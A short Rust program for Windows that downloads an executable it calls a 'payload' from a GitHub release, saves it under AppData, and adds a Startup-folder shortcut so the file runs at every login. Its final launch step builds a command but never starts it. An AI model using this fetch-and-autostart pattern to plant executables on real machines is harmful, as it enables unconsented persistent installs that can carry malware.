use std::{fs, os};

use windows::{core::{Interface, PCWSTR, PWSTR}, Win32::{System::Com::{CoCreateInstance, CoInitializeEx, IPersistFile, CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED}, UI::Shell::{IShellLinkW, ShellLink}}};

#[tokio::main]
async fn main() {
    println!("Fetching payload...");
    let download_url = "http://github.com/ctih1/kake/releases/latest/download/updater.exe";

    let resp = reqwest::get(download_url).await.expect("failed to download payload");
    let body = resp.bytes().await.expect("Invalid payload");

    let username = std::env::var("USERNAME").unwrap();

    println!("Saving payload");
    let base_path = format!("C:\\Users\\{username}\\AppData\\Local\\mun-gradia");
    if let Err(e) = fs::create_dir_all(&base_path) {
        println!("Failed to create dirs. {e}");
    }

    let path = format!("{base_path}\\updater.exe");
    if let Err(e) = fs::write(&path, body) {
        println!("failed to write payload: {}", e);
    }

    println!("Creating startup");
    
    let shortcut_path = format!("C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MunGradia.lnk\0");

    unsafe {
        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER).unwrap();

        let _ = shell_link.SetPath(PCWSTR::from_raw((path.clone()+"\0").encode_utf16().collect::<Vec<u16>>().as_ptr()));
        let _ = shell_link.SetDescription(PCWSTR::from_raw("Mun Gradia\0".encode_utf16().collect::<Vec<u16>>().as_ptr()));
        let _ = shell_link.SetWorkingDirectory(PCWSTR::from_raw("C:\\Windows\\System32\0".encode_utf16().collect::<Vec<u16>>().as_ptr()));

        let persist_file: IPersistFile = shell_link.cast().unwrap();
        let startup_w: Vec<u16> = shortcut_path.encode_utf16().chain(std::iter::once(0)).collect();
        if let Err(e) = persist_file.Save(PCWSTR::from_raw(startup_w.as_ptr()), true) {
            panic!("failed to create shortcut, {e}");
        }
        println!("Created shortcut");
    }

    println!("Running updater");
    std::process::Command::new(path);
}
